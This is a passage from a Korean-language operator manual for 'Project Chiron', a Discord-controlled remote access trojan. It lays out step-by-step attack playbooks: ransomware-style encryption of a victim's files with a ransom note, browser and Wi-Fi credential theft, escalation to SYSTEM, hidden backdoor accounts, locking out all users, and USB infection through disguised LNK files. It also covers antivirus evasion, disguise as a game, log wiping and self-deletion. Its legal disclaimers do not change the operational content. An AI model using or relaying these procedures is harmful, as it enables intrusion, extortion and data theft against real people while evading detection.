  예시: !decrypt important.docx.encrypted MySecretKey123
  결과: important.docx (원본 복원)
  ```

#### 암호화 기술 상세
- **알고리즘**: AES-256-GCM (Galois/Counter Mode)
- **키 유도**: PBKDF2-HMAC-SHA256 (100,000회 반복)
- **Salt**: 32바이트 랜덤
- **Nonce**: 12바이트 랜덤
- **인증 태그**: 16바이트 GCM 태그 (변조 방지)
- **파일 구조**: `[Salt 32B][Nonce 12B][Tag 16B][Ciphertext]`

#### 랜섬웨어 시뮬레이션 시나리오
```
1. !interesting C:\Users         # 중요 파일 위치 파악
2. !encrypt_dir C:\Users\victim\Documents  # 자동 키 생성 암호화
3. !encrypt_dir C:\Users\victim\Pictures
4. 암호화 키 저장 (복구용)
5. !download C:\ransom_note.txt   # 랜섬 노트 다운로드
6. (선택) 비밀번호로 복호화: !decrypt <파일> <키>
```

**주의사항:**
- ⚠️ 암호화 키를 잃어버리면 복구 **절대 불가능**
- ⚠️ 원본 파일은 자동으로 삭제되지 않음 (별도 삭제 필요)
- ⚠️ 대용량 파일/폴더 암호화는 시간이 오래 걸림

---

## 🗑️ 6. 흔적 제거 및 자가 삭제

시스템에서 Project Chiron의 모든 흔적을 제거하고 싶을 때 사용합니다.

### 흔적 제거 명령어
- `!clear_logs`: Windows 이벤트 로그를 삭제합니다.
- `!clear_temp`: 임시 파일 및 캐시를 삭제합니다.
- `!clear_browser`: 브라우저 히스토리, 쿠키 등을 삭제합니다.
- `!remove_persistence`: 설치된 모든 지속성 메커니즘을 제거합니다.
- `!cleanup`: 위의 모든 정리 작업을 한 번에 실행합니다.

### 자가 삭제 명령어
**⚠️ 이 명령어는 되돌릴 수 없습니다!**
- `!selfdestruct confirm`: 모든 흔적을 제거한 후, 에이전트 실행 파일 자체를 삭제하고 프로세스를 종료합니다.
- `!selfdestruct_timer <초>`: 지정된 시간(초) 후에 자가 삭제를 실행합니다.
> 📖 상세 정보: `COMPLETE_REMOVAL_GUIDE.md`

---

## 🛡️ 7. 안티바이러스(AV) 회피

- **기본 회피 기법**: 가상머신(VM) 탐지, 샌드박스 분석 회피(Sleep), 디버거 탐지 기능이 내장되어 있습니다.
- **위장**: 정상적인 '공룡 게임'으로 위장하여 사용자의 의심을 피하고 행위 기반 탐지를 우회합니다.
- **빌드 최적화**: `build.py`는 탐지율을 낮추기 위해 UPX 패킹을 비활성화하고, 정상 프로그램처럼 보이는 버전 정보를 파일에 포함시킵니다.
- **코드 난독화**: PyArmor와 같은 도구를 사용하여 코드를 난독화하면 정적 분석 기반의 탐지를 크게 줄일 수 있습니다.
> 📖 상세 정보: `AV_EVASION_GUIDE.md`

---
### 탐지 위험도 비교
아래 표는 일반적인 명령 및 기능군에 대한 상대적 탐지 위험과 간단한 완화책을 요약한 것입니다.

| 기능군 | 일반적 탐지 위험 | 완화 권장사항 |
|---|---:|---|
| 시스템 정보 조회 (`!sysinfo`, `!netstat`) | 낮음 (🟢) | 표준화된 간격으로 수행, 결과를 로컬에 잠깐 저장 후 전송 |
| 파일/토큰 탈취 (`!steal_tokens`, `!browser_creds`) | 높음 (🔴) | 샘플링, 크리티컬 시점에만 실행, 테스트 환경에서 먼저 검증 |
| 키로깅/클립보드 모니터 (`!start_keylogger`, `!clipboard_start`) | 매우 높음 (🔴) | 사용 자제 권고, 필요시 짧은 기간만 활성화 |
| USB/네트워크 전파 (`!usb_infect`, `!propagate_network`) | 매우 높음 (🔴) | 전파 기능은 기본 비활성, 제한된 스코프에서만 사용 |
| 지속성 설치 (`!persist_*`) | 중간~높음 (🟡/🔴) | 증거 제거 절차 사전 계획, 변경 로그 기록 후 제거 |
| 파일 암호화 (`!encrypt_dir`) | 높음 (🔴) | 피해 최소화 목적의 테스트에서만 사용, 키 관리 엄격히 수행 |

**권장 절차**: 가능하면 저위험(🟢) 단계로 정보 수집을 시작하여 점진적으로 탐지 위험을 감수하는 고위험 작업(🔴)으로 이동하세요. 탐지 징후가 보이면 즉시 중단하고 흔적 제거 절차를 실행하세요.

---

## 🎭 8. 실전 시나리오

### 시나리오 1: 초기 침투 및 정보 수집
1.  `!agents`로 에이전트 연결 확인.
2.  `!dashboard` 및 `!sysinfo`로 시스템 기본 정보 파악.
3.  `!check_privs`로 현재 권한 확인. 권한이 낮다면 `!elevate`로 권한 상승 시도.
4.  `!browser_creds`와 `!wifipass`로 기본 인증정보 수집.
5.  `!interesting`으로 중요 파일 위치 파악.
6.  `!screenshot`으로 현재 사용자 활동 확인.
7.  `!persist_registry`로 가장 간단한 지속성 확보.

### 시나리오 2: 시스템 완전 장악
1.  `!elevate`로 관리자 권한 획득.
2.  `!get_system`으로 SYSTEM 권한 획득.
3.  `!create_backdoor`로 숨겨진 관리자 계정 생성.
4.  `!change_all_passwords`로 모든 기존 사용자의 접근 차단.
5.  `!persist_wmi`로 탐지가 어려운 지속성 확보.
6.  `!steal_password`로 시스템 계정의 NTLM 해시 등 고급 인증정보 탈취.

### 시나리오 3: 데이터 유출 및 흔적 제거
1.  `!smart_collect`로 모든 중요 자산 수집.
2.  `!encrypt_dir C:\Users\victim\Documents MySecretKey`로 중요 데이터 암호화.
3.  `!download C:\Users\victim\Documents.zip` (압축 후) 등으로 데이터 유출.
4.  `!cleanup`으로 모든 활동 흔적 제거.
5.  `!selfdestruct confirm`으로 에이전트 완전 삭제 후 이탈.

---
### 시나리오 4: USB를 통한 물리적 공격
**목표**: 물리적으로 접근 가능한 타깃 컴퓨터에 USB 드라이브를 사용해 에이전트를 전파하고 빠르게 데이터 수집/우회 접근을 수행한다.

**전제 조건**:
- USB 드라이브(포맷 가능), 탈착 가능한 물리적 접근
- 현장 노출 시간은 최소화
- 사전 OPSEC 동의서 및 법적 승인(테스트일 경우 필수)

**단계별 절차**:
1. 로컬 워크스테이션에서 감염용 페이로드 준비
  - `SystemUpdater.exe` (또는 빌드된 실행 파일)을 USB 루트에 복사
  - 유사한 아이콘/이름으로 위장(예: `CompanyDocs.lnk`)

2. 자동 감염 준비 (권장: LNK 방식)
  - `!usb_infect` 명령은 내부적으로 다음을 수행합니다:
    - `payload.exe`를 숨김 속성으로 복사
    - `CompanyDocs.lnk`를 생성하여 실제 문서처럼 보이게 함
    - (일부 환경) `autorun.inf`를 함께 생성

3. 현장에서 실행
  - USB를 타깃 PC에 삽입하고 사용자가 파일을 실행하도록 유도
  - 타깃이 파일을 실행하면 에이전트가 활성화되어 Discord 채널로 연결

4. 초기 수집 및 우회
  - `!agents`로 연결 확인
  - `!sysinfo`로 시스템 정보 수집
  - `!check_privs` 및 `!elevate`로 권한 상승 시도
  - `!monitor_usb`로 추가 연결 감시

5. (옵션) 잠긴 컴퓨터 우회
  - 잠금 화면이거나 관리자 권한이 필요한 경우:
    - `!sticky_backdoor` 또는 `!unlock_computer`로 Sticky Keys/Utilman 백도어 설치

6. 데이터 수집 및 탈출
  - `!smart_collect`로 민감 자산 수집
  - 수집한 결과는 `!download`로 안전한 채널(운영자만 접근)으로 전송

7. 흔적 제거 및 회수
  - `!remove_persistence`로 남은 지속성 흔적 제거
  - `!cleanup` 및 `!selfdestruct confirm`로 에이전트 삭제

**안전 및 윤리 주의사항**:
- 물리적 접근 시 타인의 프라이버시를 침해하지 않도록 주의하세요.
- 법적 허가가 없는 실제 시스템에 대해 이 절차를 실행하지 마세요.
- 현장 시간 최소화, 장비 식별 가능성 줄이기.

---
## 🔐 9. 운영 보안 (OPSEC)

운영 보안(OPSEC)은 도구를 안전하고 책임감 있게 사용하는 데 필수적입니다. 아래 지침은 탐지를 최소화하고 법적/윤리적 위험을 줄이는 데 도움이 됩니다.

### 기본 원칙
- 최소 권한 원칙: 필요한 경우에만 위험한 명령을 사용하세요. 예: `!elevate`, `!get_system`, `!chrome_memory` 등은 반드시 필요할 때만 실행합니다.
- 최소 침투 범위: 타깃 컴퓨터와 작업을 제한하고 불필요한 전파 기능(`!propagate_*`)은 기본 비활성화 상태로 유지합니다.
- 증거 보존: 조사 목적이 아니라면 원본 파일을 변경하거나 삭제하지 마세요. 암호화/삭제 명령 실행 시 복구 불가능해질 수 있습니다.

### 네트워크 및 타이밍
- 트래픽 분산: 명령 실행 및 데이터 전송을 시간대와 일자에 분산시켜 행위 기반 탐지를 회피하세요.
- 속도 제한: 파일 업로드/다운로드는 제한된 대역폭으로 나누어 전송하세요.
- 지연 도입: 민감한 작업(토큰 탈취, 대량 데이터 전송)은 비활성 시간대에 예약(`!schedule`)하여 실행하세요.

### 로그 및 흔적 관리
- 로컬 로그 확인: `!check_privs`, `!persist_status`로 변경 여부 확인 후 `!clear_logs`로 불필요한 로그를 정리하세요.
- 이벤트 로그 최소화: 레지스트리, 예약 작업, 서비스 변경을 할 때는 변경 흔적을 삭제하는 절차를 항상 계획하세요.

### 도구 사용 정책
- 승인 문서: 합법적 테스트의 경우 항상 서면 동의(스코프, 기간, 테스트 책임자)를 확보하세요.
- 격리 환경: 가능한 경우 가상 머신(VM)이나 별도 네트워크에서 테스트를 수행하세요.
- 감사 추적: 모든 명령 실행 기록을 별도 안전한 로그(오프사이트)에 기록해 연구 목적으로만 보관하세요.

### 탐지 회피 권장사항 (저위험 우선)
- 정보 수집(예: `!sysinfo`, `!netstat`) → 낮은 위험(🟢)으로 먼저 수행.
- 파일 다운로드/업로드는 작은 조각으로 분할 전송.
- 고위험 작업(예: 키로거, 토큰 탈취, 암호 변경)은 테스트 환경에서 사전 검증 후 신중히 사용.

### 법적·윤리적 고려사항
- 관할권 확인: 테스트 대상 시스템이 위치한 국가 및 관할권의 법률을 확인하세요.
- 승인 대상: 개인 사용자 장비나 제3자 시스템에는 절대 미승인 액세스를 시도하지 마세요.
- 보고 의무: 연구 결과에 민감한 취약점이 포함될 경우, 해당 조직/제조사에 책임있는 공개(Responsible Disclosure)를 고려하세요.

---
## 🛠️ 10. 문제 해결 (Troubleshooting)

아래는 Project Chiron 사용 중 자주 마주칠 수 있는 문제와 해결 방법입니다.

### 봇 연결 문제
- 증상: 봇이 Discord에 연결되지 않음, `CORE` 프로세스가 실행되지만 응답 없음.
  - 점검 사항:
    1. `core.py` 상단의 `BOT_TOKEN`, `CHANNEL_ID`, `OPERATOR_ID`가 올바른지 확인.
    2. Discord 봇의 권한(메시지 읽기/쓰기, 파일 첨부)이 설정되었는지 확인.
    3. `MESSAGE CONTENT INTENT`가 활성화되어 있는지 확인.
  - 해결:
    - 토큰이 잘못되었다면 새 토큰을 생성하여 교체.
    - 봇을 서버에서 제거 후 재초대하여 권한 재부여.

### 권한/권한 상승 실패
- 증상: `!elevate`나 `!persist_wmi`가 실패.
  - 점검 사항:
    1. 현재 프로세스 권한을 `!check_privs`로 확인.
    2. UAC(User Account Control) 수준이 높은지 확인.
  - 해결:
    - `!elevate` 실패 시 수동으로 관리자 권한으로 재시작하거나 `!bypass_uac`를 시도.
    - 일부 UAC 우회는 최신 패치에서 작동하지 않을 수 있으므로 로그(`!monitor_status`)를 확인하고 대체 기법 사용.

### 명령 타임아웃/출력 잘림
- 증상: 긴 명령어 실행 시 출력이 잘리거나 명령이 타임아웃됨.
  - 점검 사항:
    1. `!shell_start` 세션의 타임아웃 설정(기본 10초)을 확인.
    2. 출력 크기 제한(Discord 메시지 제한)을 확인.
  - 해결:
    - 긴 작업은 `!schedule`로 백그라운드 예약하거나 결과 파일로 저장 후 `!download`로 전송.
    - 명령 출력은 파일로 저장 후 업로드하여 전체 로그 확인.

### 안티바이러스(AV)로 인한 차단
- 증상: 에이전트가 설치 도중 제거되거나 기능 일부가 차단됨.
  - 점검 사항:
    1. AV 이벤트 로그 및 탐지 경고 확인.
    2. 빌드(UPX, 서명 등) 설정을 검토.
  - 해결:
    - `build.py`에서 서명/난독화 설정을 변경하여 새 빌드를 생성.
    - 탐지 원인(특정 API 호출, 행위 패턴 등)을 분석하고 대체 구현 사용.

### USB 전파/모니터링 문제
- 증상: `!usb_infect`가 드라이브를 감염시키지 못함 또는 `!usb_monitor`가 새 연결을 감지하지 못함.
  - 점검 사항:
    1. 드라이브에 쓰기 권한이 있는지 확인.
    2. Windows 정책(특히 최신 Windows 10/11)은 autorun.inf를 무시할 수 있음.
  - 해결:
    - LNK 트릭 사용 시 숨김 속성 및 올바른 대상 경로 적용.
    - 정책이 강한 환경에서는 USB 전파 대안(네트워크 전파)을 고려.

### 파일 전송 실패
- 증상: `!upload` 또는 `!download`가 실패함.
  - 점검 사항:
    1. Discord 파일 업로드 제한(크기)을 초과했는지 확인.
    2. 파일 경로 권한을 확인.
  - 해결:
    - 큰 파일은 분할 압축 후 전송하거나 외부 호스팅(허용 시)을 사용.

### 로그 및 디버그 팁
- `!monitor_status`, `!persist_status`로 현재 상태를 점검.
- 에이전트 로그는 로컬 `logs/` 디렉터리에 저장됩니다(경로 설정 확인).
- 문제가 재현 가능하면 `!dump_debug`로 디버그 패키지를 생성하여 안전한 위치로 전송하세요.

---
**이 매뉴얼이 Project Chiron의 모든 기능을 이해하고 활용하는 데 도움이 되기를 바랍니다.**

---
## 🧾 12. 법적 면책조항 (확장)

이 도구는 강력한 원격 제어 및 침투 기능을 제공하므로 법적·윤리적 책임이 매우 중요합니다. 아래 지침을 반드시 읽고 준수하세요.

### 허가 및 승인
- 이 소프트웨어를 사용하는 모든 행위는 대상 시스템 소유자의 명시적 서면 허가를 받아야 합니다.
- 기업 환경에서 테스트하는 경우, 테스트 범위(대상 시스템, 기간, 사용되는 기능)를 문서화한 동의서와 책임자 연락처를 확보하세요.

### 책임 있는 공개(Responsible Disclosure)
- 본 소프트웨어 사용 중 발견된 취약점이나 민감한 데이터는 해당 조직 및 소프트웨어 공급자에게 책임있게 보고하세요.
- 보고 시 취약점 재현 코드나 민감 데이터는 포함하지 말고, 재현 방법과 영향 범위를 기술하세요.

### 관할권 및 법률 준수
- 각 국가 및 지역의 컴퓨터 범죄법은 다릅니다. 타 지역 대상 시스템에 접근하기 전 해당 관할권의 법률을 확인하세요.
- 무단 액세스, 데이터 절취, 서비스 방해 등은 대부분의 관할권에서 범죄입니다.

### 연구·교육용 예외
- 학술적 연구나 교육 목적이라도 소유자 허가 없이 실제 시스템에서 공격 행위를 실행할 수 없습니다.

### 보안 및 개인정보 보호
- 개인정보(민감 개인 정보)는 법적 규제가 높습니다. 데이터 접근 후에는 법적 요구사항을 준수하여 보호 및 파기하세요.

### 처벌 및 법적 조치
- 이 도구의 오용으로 인한 민·형사상 책임은 전적으로 사용자에게 있습니다. 조직의 정책 위반이나 범죄 행위는 형사처벌의 대상이 될 수 있습니다.

---
